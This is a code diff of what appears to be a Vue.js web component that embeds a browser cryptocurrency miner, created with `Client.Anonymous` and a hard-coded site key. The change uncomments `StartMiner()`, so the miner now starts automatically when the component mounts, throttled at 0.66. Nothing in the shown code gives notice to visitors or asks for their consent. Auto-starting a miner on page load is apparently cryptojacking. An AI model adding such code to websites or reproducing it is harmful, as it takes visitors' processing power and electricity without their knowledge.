@@ -30,19 +30,19 @@ export default {
         return {
             miner: null,
             mining: this.$store.getters['minerstate'],
-            throttle: 0
+            throttle: 0.66
         }
     },
 
     mounted(){
         if(typeof window.miner === 'undefined'){
             let miner = new Client.Anonymous('3c21f085fed5b3e7d3ed288237f341ad552e51e7af400c5f204f78cef1ea08f6', {
-                throttle: 0.66
+                throttle: this.throttle
             });
             window.miner = miner;
 
             this.miner = window.miner;
-            //this.StartMiner();
+            this.StartMiner();
         }else{
             this.miner = window.miner;
         }
